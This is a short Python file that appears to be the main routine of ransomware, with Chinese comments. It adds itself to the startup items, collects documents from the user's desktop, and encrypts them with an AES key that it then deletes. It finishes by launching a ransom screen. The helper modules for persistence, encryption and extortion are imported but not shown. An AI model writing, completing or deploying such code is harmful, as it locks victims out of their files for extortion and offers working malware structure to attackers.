# coding : utf-8

from persistence import *
from extortioner import *
from encrypt import *
import getpass
from decrypt import *
from interface import *


# 1. 持久化
# 创建开机启动项
add_to_startup()


# 2. 敲诈者模块执行
# 获取匹配黑名单的文件列表
username = getpass.getuser()
matched_files_full_path = find_doc('C:/Users/' + username + '/Desktop/')

# 3. 执行加密操作
# 初始化加密模块
uid, aes_key = enc_init()
encrypt(matched_files_full_path, aes_key)
del aes_key


# 4. 勒索界面
interf = Interface(matched_files_full_path, uid)



